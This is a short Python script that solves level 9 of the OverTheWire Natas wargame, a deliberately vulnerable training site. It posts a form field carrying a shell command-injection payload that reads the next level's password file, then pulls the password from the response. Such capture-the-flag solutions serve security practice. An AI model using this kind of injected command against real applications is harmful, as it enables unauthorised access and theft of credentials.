import requests
import re
from requests.auth import HTTPBasicAuth
def solve9(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    session.headers["Content-Type"] = "application/x-www-form-urlencoded"
    resp = session.post("http://natas9.natas.labs.overthewire.org/", data="needle=; cat /etc/natas_webpass/natas10; #&submit=Search")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
